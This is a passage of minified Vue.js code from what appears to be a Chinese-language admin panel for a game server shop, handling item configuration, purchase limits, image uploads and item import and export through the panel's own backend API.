e.uploadLoading=!1,e.$emit("change",a.data.data.url),t.prev=17,n={name:a.data.data.url.split("?")[1],url:a.data.data.url},t.next=21,f({method:"POST",url:"/attachmentsAdminSys/add",data:n});case 21:t.next=27;break;case 23:t.prev=23,t.t0=t.catch(17),e.$message.error(t.t0.toString()),console.error(t.t0);case 27:e.$message.success("上传成功，已替换URL"),e.$emit("change-show-upload-config",!1),e.uploadConfigType="file",e.$set(e,"uploadConfig",{file:[],fileurl:""}),e.uploadConfigType="attachments",t.next=37;break;case 34:e.uploadLoading=!1,e.$message.error("错误码".concat(a.data.code,": ").concat(a.data.info)),console.error(a.data);case 37:t.next=44;break;case 39:t.prev=39,t.t1=t.catch(3),e.uploadLoading=!1,e.$message.error(t.t1.toString()),console.error(t.t1);case 44:case"end":return t.stop()}}),t,null,[[3,39],[17,23]])})))()}}},Pe=Ee,Ae=Object(S.a)(Pe,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%"}},[i("div",{staticStyle:{width:"100%"}},[i("a-input",{staticStyle:{width:"calc(100% - 104px)"},attrs:{value:e.value,allowClear:"",disabled:e.disabled},on:{change:function(t){return e.$emit("change",t.target.value)}}}),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{disabled:e.disabled,size:"small",icon:e.showUploadConfig?"up":"down"},on:{click:function(t){return e.$emit("change-show-upload-config",!e.showUploadConfig)}}},[e._v(e._s(e.showUploadConfig?"收起选项":"上传选项"))])],1),e.showUploadConfig?[i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("类型：")]),i("a-radio-group",{attrs:{"button-style":"solid",size:"small"},model:{value:e.uploadConfigType,callback:function(t){e.uploadConfigType=t},expression:"uploadConfigType"}},[i("a-radio-button",{attrs:{value:"file"}},[e._v("文件")]),i("a-radio-button",{attrs:{value:"fileurl"}},[e._v("URL转换")]),i("a-radio-button",{attrs:{value:"attachments"}},[e._v("选择附件")])],1),"attachments"!==e.uploadConfigType?i("a-button",{staticStyle:{float:"right",transform:"translateY(8px)"},attrs:{type:"primary",size:"small",loading:e.uploadLoading,icon:"upload",disabled:"file"===e.uploadConfigType&&!(e.uploadConfig.file&&e.uploadConfig.file.length)||"fileurl"===e.uploadConfigType&&!(e.uploadConfig.fileurl&&e.uploadConfig.fileurl.length)},on:{click:e.uploadImg}},[e._v("上传")]):e._e()],1),"file"===e.uploadConfigType?i("div",{staticStyle:{width:"100%"}},[i("a-upload-dragger",{attrs:{name:"file","file-list":e.uploadConfig.file,remove:function(){return e.$set(e.uploadConfig,"file",null)},"before-upload":function(t){return e.$set(e.uploadConfig,"file",[t]),!1}}},[i("p",{staticClass:"ant-upload-drag-icon"},[i("a-icon",{attrs:{type:"inbox"}})],1),i("p",{staticClass:"ant-upload-text"},[e._v(" 点此选择或者拖拽文件到此上传 ")]),i("p",{staticClass:"ant-upload-hint"},[e._v(" 图片格式支持JPG、JPEG、GIF、PNG，单张图片不可超过10M。 ")])])],1):"fileurl"===e.uploadConfigType?i("div",{staticStyle:{width:"100%"}},[i("span",[e._v("源文件URL：")]),i("a-input",{staticStyle:{width:"calc(100% - 86px)","margin-left":"5px"},attrs:{allowClear:""},model:{value:e.uploadConfig.fileurl,callback:function(t){e.$set(e.uploadConfig,"fileurl",t)},expression:"uploadConfig.fileurl"}})],1):i("div",{staticStyle:{width:"100%"}},[i("mini-attachments-list",{on:{select:function(t){e.$emit("change",t)}}})],1)]:e._e()],2)}),[],!1,null,"f9f6dc5c",null),De=Ae.exports,$e={name:"ItemAdmin",components:{CommandsPicker:_e,ImageSelect:De},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{specialTips:{"special-welcomepack":"修改限购规则不会生效，新手礼包内容的请修改生成命令","special-fames":"修改生成命令、限购规则不会生效，声望价格请前往商城配置管理模块修改","special-welcome-didi":"修改限购规则、生成命令和价格不会生效，修改套餐包含次数将影响新注册用户的可领取次数(已注册用户不影响)","special-send-game-message":"修改限购规则、生成命令和价格不会生效，发送每一行公屏消息的价格请前往商城配置管理模块修改","special-user-location-teleport":"修改生成命令不会生效","special-map-teleport":"修改生成命令不会生效","special-team-teleport":"修改生成命令不会生效","special-squad-gather":"修改生成命令不会生效","special-safe-zone-teleport":"修改生成命令不会生效","special-hot-point-teleport":"修改生成命令不会生效","special-monitors":"修改生成命令不会生效","special-buy-user-location":"修改生成命令不会生效","special-new-gift":"修改生成命令不会生效","special-random-prize":"修改生成命令和价格不会生效，关闭购买限制将导致商城配置管理模块的自由购买限制失效","special-login-set-everyday":"修改限购规则不会生效，每日登录礼包内容的请修改生成命令","special-safe-zone":"修改生成命令不会生效","special-god-mode":"修改生成命令不会生效"},configTypeLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-monitors","special-random-prize","special-new-gift","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],isBlockLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-monitors","special-random-prize","special-new-gift","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],isTeleportLimitType:["special-fames","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-buy-user-location","special-safe-zone","special-god-mode"],purchaseLimitOnLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-new-gift","special-send-game-message","special-login-set-everyday"],purchaseLimitTimeLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-new-gift","special-send-game-message","special-login-set-everyday"],purchaseLimitEachLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-new-gift","special-send-game-message","special-login-set-everyday"],totalLimitLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-new-gift","special-send-game-message","special-random-prize","special-login-set-everyday"],specificUserLimitLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],moneyToUserLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],multipleLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],multiTimeLimitType:["special-welcomepack","special-fames","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],levelLimitTypeLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-new-gift","special-random-prize","special-login-set-everyday"],levelLimitLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-new-gift","special-random-prize","special-login-set-everyday"],militaryLevelLimitLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-new-gift","special-random-prize","special-login-set-everyday"],buyLimitLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-login-set-everyday"],enableDiyLocationLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],diyLocationLimitType:["special-welcomepack","special-fames","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],noSquadBuyLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-send-game-message","special-user-location-teleport","special-map-teleport","special-team-teleport","special-squad-gather","special-safe-zone-teleport","special-hot-point-teleport","special-new-gift","special-monitors","special-random-prize","special-login-set-everyday","special-buy-user-location","special-safe-zone","special-god-mode"],noVipDiscountLimitType:["special-welcomepack","special-fames","special-welcome-didi","special-new-gift","special-send-game-message","special-random-prize","special-login-set-everyday"],importItemsUploadStatusStageMap:{none:"未开始",uploadImg:"上传图片",uploadData:"上传数据",done:"已完成"},location:location,Error:Error,moment:R.a,cloneDeep:A.cloneDeep,levelList:[],militaryLevelList:[],purchaseLimitEachKeyValue:{second:"每秒",minute:"每分钟",hour:"每小时",day:"每日(24小时)",day_start:"每日(0时起)",week:"每周(7天)",week_start:"每周(周一起)",month:"每月(30天)",month_start:"每月(1号起)",once:"永久"},loadingItemListTable:!1,itemListFilter:{name:void 0,type:void 0},itemListColumns:[{title:"商品名称",key:"name",dataIndex:"name",width:250,align:"center",scopedSlots:{customRender:"name"}},{title:"商品类型",key:"type",dataIndex:"type",width:120,align:"center",scopedSlots:{customRender:"type"}},{title:"价格",key:"price",dataIndex:"price",width:100,align:"center",scopedSlots:{customRender:"price"}},{title:"商品图片",key:"imgSrc",dataIndex:"imgSrc",width:135,align:"center",scopedSlots:{customRender:"imgSrc"}},{title:"销量",key:"sales",dataIndex:"sales",width:100,align:"center",scopedSlots:{customRender:"sales"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"操作",key:"controls",dataIndex:"controls",width:180,align:"center",scopedSlots:{customRender:"controls"}}],itemListData:[],itemListPagination:{pageSize:20,pageNum:1,total:0},itemTypesList:[],showAdd2EditItemModal:!1,add2EditItemModalType:"add",add2EditItemForm:{id:-1,name:"",type:"",price:0,configType:"command",isBlock:!1,commands:"",imgSrc:"",sales:0,configs:{addDollar:0,isTeleport:!0,noTeleportMode:"mode1",moneyToUser:"",purchaseLimitOn:!1,purchaseLimit:{time:0,each:""},levelPurchaseLimit:[],totalLimit:0,specificUserLimit:[],multiple:!1,multiTime:0,description:"",levelLimitType:">=",levelLimit:0,buyLimit:0,enableDiyLocation:!1,diyLocation:"0 0 200",noSquadBuy:!1,noVipDiscount:!1}},add2EditItemLoading:!1,add2EditItemRules:{name:[{required:!0,trigger:"change",message:"请输入商品名称",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入商品名称"))}}],type:[{required:!0,trigger:"change",message:"请选择商品类型",validator:function(e,t,i){t&&t.length?i():i(new Error("请选择商品类型"))}}],price:[{required:!0,trigger:"change",message:"请输入商品价格(>=0)",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入商品价格(>0)"))}}],configType:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){t&&t.length?i():i(new Error("请选择"))}}],isBlock:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],commands:[{required:!0,trigger:"change",message:"请输入生成命令",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入生成命令"))}}],imgSrc:[{required:!0,trigger:"change",message:"请输入图片链接",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入图片链接"))}}],sales:[{required:!0,trigger:"change",message:"请输入销量(≥0)",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入销量(≥0)"))}}],"configs.isTeleport":[{required:!0,trigger:"change",message:"请选择是否传送到玩家身边",validator:function(e,t,i){console.log(t),"boolean"==typeof t?i():i(new Error("请选择是否传送到玩家身边"))}}],"configs.purchaseLimitOn":[{required:!0,trigger:"change",message:"请选择是否启用购买频率限制",validator:function(e,t,i){console.log(t),"boolean"==typeof t?i():i(new Error("请选择是否启用购买频率限制"))}}],"configs.levelLimit":[{trigger:"change",message:"请选择限制等级",validator:function(e,t,i){console.log(t),"number"==typeof t&&t>=0||void 0===t?i():i(new Error("请选择限制等级"))}}],"configs.buyLimit":[{trigger:"change",message:"请输入限购限量(>=0, 0代表关闭限购)",validator:function(e,t,i){console.log(t),"number"==typeof t&&t>=0||void 0===t?i():i(new Error("请选择限购限量(>=0, 0代表关闭限购)"))}}]},updateAllTeleportLoading:!1,showUploadConfig:!1,exportLoading:!1,showImportItemsItemModal:!1,importItemsLoading:!1,importItemsType:"own",importItemsYingZiBaseUrl:"",importItemsTxt:!1,importItemsUploadStatus:{stage:"none",current:0,total:0},importYingZiUploadFailures:[],updateItemPriceModal:!1,updateItemPriceModalType:"all",updateItemPriceForm:{action:"plus",param:1},updateItemPriceLoading:!1,updateItemPriceRules:{action:[{required:!0,trigger:"change",message:"请选择运算符",validator:function(e,t,i){t&&t.length?i():i(new Error("请选择运算符"))}}],param:[{required:!0,trigger:"change",message:"请输入修改参数",validator:function(e,t,i){"number"==typeof t&&t>0?i():i(new Error("请输入修改参数"))}}]},searchSpecificUserNameList:[],searchMoneyToUserNameList:[],selectedRowKeys:[]}},mounted:function(){this.$route.query.name&&(this.itemListFilter.name=this.$route.query.name),this.getItemList(),this.getItemTypeList(),this.getLevelList(),this.getMilitaryLevelList()},methods:{doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制商品ID到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},getLevelList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/levelAdminSys/list",params:{pageNum:1,pageSize:99999}});case 3:200===(i=t.sent).status&&(e.levelList=i.data.list),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},getMilitaryLevelList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/info",params:{name:"MilitaryLevelConfigs"}});case 3:200===(i=t.sent).status&&(e.militaryLevelList=null===(a=i.data)||void 0===a?void 0:a.value),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},onItemListCleanFilter:function(){var e=this;Object.keys(this.$route.query).length>1&&this.$router.push({path:"/items",query:{category:"Item"}}),this.itemListPagination.pageNum=1,this.$nextTick((function(){e.getItemList(!0)}))},onItemListFilter:function(){var e=this;Object.keys(this.$route.query).length>1&&this.$router.push({path:"/items",query:{category:"Item"}}),this.itemListPagination.pageNum=1,this.$nextTick((function(){e.getItemList()}))},onChangeItemListPagination:function(e){var t=this;this.itemListPagination.pageNum=e,this.$nextTick((function(){t.getItemList()}))},onShowSizeChangeItemListPagination:function(e,t){var i=this;this.itemListPagination.pageNum=1,this.itemListPagination.pageSize=t,this.$nextTick((function(){i.getItemList()}))},getItemList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.itemListPagination,n=a.pageNum,r=a.pageSize,e?(t.itemListFilter={name:void 0,type:void 0},o={pageNum:n,pageSize:r}):(l=Object(A.cloneDeep)(t.itemListFilter),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingItemListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/itemAdminSys/list",params:o});case 6:c=i.sent,t.loadingItemListTable=!1,200===c.status&&(t.itemListPagination.total=c.data.count,t.itemListData=c.data.list,t.selectedRowKeys=[]),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingItemListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},getItemTypeList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={pageNum:1,pageSize:99999},t.prev=1,t.next=4,f({method:"GET",url:"/itemTypesAdminSys/list",params:i});case 4:200===(a=t.sent).status&&(e.itemTypesList=a.data.list),t.next=11;break;case 8:t.prev=8,t.t0=t.catch(1),console.error(t.t0);case 11:case"end":return t.stop()}}),t,null,[[1,8]])})))()},deleteItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/itemAdminSys/delete",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getItemList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},deleteItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"DELETE",url:"/itemAdminSys/deleteItems",data:i});case 4:200===(a=t.sent).status&&(null!=a&&null!==(n=a.data)&&void 0!==n&&null!==(r=n.failIds)&&void 0!==r&&r.length?e.$message.warning("成功".concat(null==a||null===(o=a.data)||void 0===o?void 0:o.success,"个，以下ID删除出错: ").concat(null==a||null===(s=a.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getItemList()),t.next=11;break;case 8:t.prev=8,t.t0=t.catch(1),console.error(t.t0);case 11:case"end":return t.stop()}}),t,null,[[1,8]])})))()},isSpecialItem:function(e){var t=e.itemType;return t&&t.name&&t.name.startsWith("special-")},clickAddItem:function(){this.add2EditItemModalType="add",this.add2EditItemForm={id:-1,name:"",type:"",price:0,configType:"command",isBlock:!1,commands:"",imgSrc:"".concat(window.BACKEND_HOST,"/image/getOldImg?originalPath=https://i1.fuimg.com/734277/a4c3d5836939c119.jpg"),sales:0,configs:{addDollar:0,isTeleport:!0,noTeleportMode:"mode1",moneyToUser:"",purchaseLimitOn:!1,purchaseLimit:{time:0,each:""},levelPurchaseLimit:[],totalLimit:0,specificUserLimit:[],multiple:!1,multiTime:0,description:"",levelLimitType:">=",levelLimit:0,militaryLevelLimit:void 0,buyLimit:0,enableDiyLocation:!1,diyLocation:"0 0 200",noSquadBuy:!1,noVipDiscount:!1}},this.showUploadConfig=!1,this.uploadConfigType="file",this.showAdd2EditItemModal=!0},clickUpdateItem:function(e){var t,i;this.add2EditItemModalType="edit";var a,n={id:e.id,name:e.name,type:e.type,price:e.price,configType:e.configType||"command",isBlock:"boolean"==typeof e.isBlock&&e.isBlock,commands:e.commands,imgSrc:e.imgSrc,sales:e.sales,configs:{addDollar:0,isTeleport:!0,noTeleportMode:"mode1",moneyToUser:"",purchaseLimitOn:!1,purchaseLimit:{time:0,each:""},levelPurchaseLimit:[],totalLimit:0,specificUserLimit:[],multiple:!1,multiTime:0,description:"",levelLimitType:">=",levelLimit:0,militaryLevelLimit:void 0,buyLimit:0,enableDiyLocation:!1,diyLocation:"0 0 200",noSquadBuy:!1,noVipDiscount:!1}};!e.itemType||"special-welcomepack"!==e.itemType.name&&"special-fames"!==e.itemType.name?n.sales=e.sales:n.sales=0;try{a=JSON.parse(e.configs)}catch(e){console.log(e),a={addDollar:!0,isTeleport:!0,noTeleportMode:"mode1",moneyToUser:"",purchaseLimitOn:!1,purchaseLimit:{time:0,each:""},levelPurchaseLimit:[],totalLimit:0,specificUserLimit:[],multiple:!1,multiTime:0,description:"",levelLimitType:">=",levelLimit:0,militaryLevelLimit:void 0,buyLimit:0,enableDiyLocation:!1,diyLocation:"0 0 200",noSquadBuy:!1,noVipDiscount:!1}}n.configs.addDollar="number"==typeof a.addDollar?a.addDollar:0,n.configs.isTeleport="boolean"!=typeof a.isTeleport||a.isTeleport,n.configs.noTeleportMode="string"==typeof a.noTeleportMode?a.noTeleportMode:"mode1",n.configs.moneyToUser=a.moneyToUser?a.moneyToUser:[],n.configs.purchaseLimitOn=!0===(a.purchaseLimit&&a.purchaseLimit.each&&a.purchaseLimit.time>0),n.configs.purchaseLimit.time=!0===(a.purchaseLimit&&!!a.purchaseLimit.time)?a.purchaseLimit.time:0,n.configs.purchaseLimit.each=!0===(a.purchaseLimit&&!!a.purchaseLimit.each)?a.purchaseLimit.each:"",n.configs.levelPurchaseLimit=a.levelPurchaseLimit?a.levelPurchaseLimit.map((function(e){return e.purchaseLimitOn=!0===(e.purchaseLimit&&e.purchaseLimit.each&&e.purchaseLimit.time>0),e.purchaseLimit||(e.purchaseLimit={time:0,each:""}),e})):[],n.configs.totalLimit=a.totalLimit?a.totalLimit:0,n.configs.specificUserLimit=a.specificUserLimit?a.specificUserLimit:[],n.configs.multiple=a.multiTime>0,n.configs.multiTime=a.multiTime?a.multiTime:0,n.configs.description="special-welcomepack"===n.type||"special-welcome-didi"===n.type||"special-login-set-everyday"===n.type?a.description:void 0,n.configs.levelLimitType=a.levelLimitType&&a.levelLimitType.length?a.levelLimitType:">=",n.configs.levelLimit=a.levelLimit,n.configs.militaryLevelLimit=a.militaryLevelLimit,n.configs.buyLimit=a.buyLimit,n.configs.enableDiyLocation=(null===(t=a.diyLocation)||void 0===t?void 0:t.length)>0,n.configs.noVipDiscount="boolean"==typeof a.noVipDiscount&&a.noVipDiscount,n.configs.noSquadBuy="boolean"==typeof a.noSquadBuy&&a.noSquadBuy,n.configs.diyLocation=(null===(i=a.diyLocation)||void 0===i?void 0:i.length)>0?a.diyLocation:"",this.$set(this,"add2EditItemForm",n),a.moneyToUser&&a.moneyToUser.length&&this.loadInitialMoneyToUserName(a.moneyToUser),a.specificUserLimit&&a.specificUserLimit.length&&this.loadInitialSpecificUserName(a.specificUserLimit),this.showUploadConfig=!1,this.showAdd2EditItemModal=!0},clickCancelAdd2EditItemModal:function(){this.add2EditItemModalType="new",this.add2EditItemForm={id:-1,name:"",type:"",price:0,configType:"command",isBlock:!1,commands:"",imgSrc:"",sales:0,configs:{addDollar:0,isTeleport:!0,noTeleportMode:"mode1",moneyToUser:"",purchaseLimitOn:!1,purchaseLimit:{time:0,each:""},levelPurchaseLimit:[],totalLimit:0,specificUserLimit:[],multiple:0,multiTime:0,description:"",levelLimitType:">=",levelLimit:0,militaryLevelLimit:void 0,buyLimit:0,enableDiyLocation:!1,diyLocation:"0 0 200",noVipDiscount:!1,noSquadBuy:!1}},this.showUploadConfig=!1,this.showAdd2EditItemModal=!1},topItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,a={id:e,topTimeStamp:Date.now()},i.next=4,f({method:"PUT",url:"/itemAdminSys/update",data:a});case 4:200===(n=i.sent).status?(t.$message.success("置顶成功"),t.getItemList()):(console.log("错误",n),t.$message.error(n.msg)),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(0),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[0,8]])})))()},submitAdd2EditItem:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.add2EditItemForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n,r,o,s,l,c,d,u,p,m,g,h,y,v,x,b,S;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=35;break}a=Object(A.cloneDeep)(e.add2EditItemForm),n=a.id,r=a.name,o=a.type,s=a.price,l=a.configType,c=a.isBlock,d=a.commands,u=a.imgSrc,p=a.sales,m=a.configs,console.log(JSON.parse(JSON.stringify(m))),g={name:r,type:o,price:s,configType:l,isBlock:c,commands:d,imgSrc:u,sales:p},-1!==n&&(g.id=n),"number"!=typeof m.addDollar&&(m.addDollar=0),"boolean"!=typeof m.isTeleport&&(m.isTeleport=!0),"string"!=typeof m.noTeleportMode&&(m.noTeleportMode="mode1"),m.purchaseLimitOn?delete m.purchaseLimitOn:(delete m.purchaseLimitOn,delete m.purchaseLimit),m.multiple||(delete m.multiple,delete m.multiTime),m.totalLimit||delete m.totalLimit,h=[],y=Object(we.a)(m.levelPurchaseLimit);try{for(y.s();!(v=y.n()).done;)x=v.value,(b=x).purchaseLimitOn?delete b.purchaseLimitOn:(delete b.purchaseLimitOn,delete b.purchaseLimit),b.totalLimit||delete b.totalLimit,Object.keys(b).length>1&&h.push(b)}catch(e){y.e(e)}finally{y.f()}return m.levelPurchaseLimit=h,("edit"!==e.add2EditItemModalType||"special-welcomepack"!==e.add2EditItemForm.type&&"special-welcome-didi"!==e.add2EditItemForm.type&&"special-login-set-everyday"!==e.add2EditItemForm.type)&&delete m.description,m.levelLimitType&&m.levelLimitType.length||(m.levelLimitType=">="),m.levelLimit||(m.levelLimit=0),m.buyLimit||(m.buyLimit=0),m.enableDiyLocation||(delete m.enableDiyLocation,delete m.diyLocation),console.log(JSON.parse(JSON.stringify(m))),g.configs=JSON.stringify(m),e.add2EditItemLoading=!0,t.prev=23,t.next=26,f({method:"add"===e.add2EditItemModalType?"POST":"PUT",url:"add"===e.add2EditItemModalType?"/itemAdminSys/add":"/itemAdminSys/update",data:g});case 26:S=t.sent,e.add2EditItemLoading=!1,200===S.status?(e.$message.success("".concat("add"===e.add2EditItemModalType?"新增":"编辑","添加成功")),e.add2EditItemModalType="add",e.showUploadConfig=!1,e.showAdd2EditItemModal=!1,e.add2EditItemLoading=!1,e.add2EditItemForm={id:-1,name:"",cnName:"",canBeDeleted:!0},e.getItemList()):(console.log("错误",S),e.$message.error(S.msg)),t.next=35;break;case 31:t.prev=31,t.t0=t.catch(23),console.error(t.t0),e.add2EditItemLoading=!1;case 35:case"end":return t.stop()}}),t,null,[[23,31]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},clickUpdateAllTeleport:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return t.updateAllTeleportLoading=!0,i.prev=1,i.next=4,f({method:"PUT",url:"/itemAdminSys/updateAllTeleport",data:{isTeleport:e}});case 4:a=i.sent,t.updateAllTeleportLoading=!1,200===a.status?(t.$message.success(a.msg),t.updateAllTeleportLoading=!1,t.getItemList()):(console.log("错误",a),t.$message.error(a.msg)),i.next=13;break;case 9:i.prev=9,i.t0=i.catch(1),console.error(i.t0),t.updateAllTeleportLoading=!1;case 13:case"end":return i.stop()}}),i,null,[[1,9]])})))()},clickExportItemsList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.exportLoading=!0,t.next=4,f({method:"GET",url:"/itemAdminSys/export"});case 4:200===(i=t.sent).status&&(a=JSON.stringify({data:i.data}),(n=document.createElement("a")).setAttribute("href","data:text/plain;charset=utf-8,"+encodeURIComponent(a)),n.setAttribute("download","items.log"),n.style.display="none",document.body.appendChild(n),n.click(),document.body.removeChild(n),e.exportLoading=!1,e.$message.success("导出成功")),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.exportLoading=!1,e.$message.error("下载出错："+t.t0.toString());case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()},submitImportItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l,c,d,u,p,m,g,h,y,v,x,b,S,w,L,k,I,_;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.importItemsLoading=!0,e.importYingZiUploadFailures=[],t.prev=2,i=JSON.parse(e.importItemsTxt),"own"===e.importItemsType&&i.data&&void 0===i.data.find((function(e){return!(e.name&&"number"==typeof e.price&&e.configType&&e.commands&&e.imgSrc&&e.imgSrc&&"number"==typeof e.sales&&e.configs)}))||"yingzi"===e.importItemsType&&i.rows&&void 0===i.rows.find((function(e){return!(e.name&&"number"==typeof e.category_id&&"number"==typeof parseInt(e.price)&&!isNaN(parseInt(e.price))&&"string"==typeof e.code&&e.image&&"number"==typeof e.actual_sales&&e.is_vip_status_text)}))){t.next=8;break}return e.importItemsLoading=!1,e.$message.error("导入格式不正确"),t.abrupt("return");case 8:if("yingzi"!==e.importItemsType){t.next=60;break}if(i.rows=i.rows.map((function(e){return e.code.length||(e.code=" "),e.name="".concat(e.id,"_").concat(e.name),e})),e.importItemsYingZiBaseUrl&&e.importItemsYingZiBaseUrl.length){t.next=14;break}return e.importItemsLoading=!1,e.$message.error("来源商城的HOST不能为空"),t.abrupt("return");case 14:e.$set(e,"importItemsUploadStatus",{stage:"uploadImg",current:0,total:i.rows.length}),a={},n=0,r=0,o=Object(we.a)(i.rows),t.prev=19,o.s();case 21:if((s=o.n()).done){t.next=47;break}if(l=s.value,void 0===a[l.image]){t.next=26;break}return n++,t.abrupt("continue",45);case 26:return 